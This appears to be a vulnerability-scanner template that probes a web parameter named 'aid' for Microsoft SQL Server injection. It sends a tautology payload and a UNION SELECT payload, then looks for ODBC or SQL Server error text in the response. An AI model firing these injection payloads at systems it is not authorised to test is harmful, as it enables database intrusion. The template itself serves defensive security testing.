id: sqli6-mssql-07
name: 'SQLi mssql probe in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - ''') OR (''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
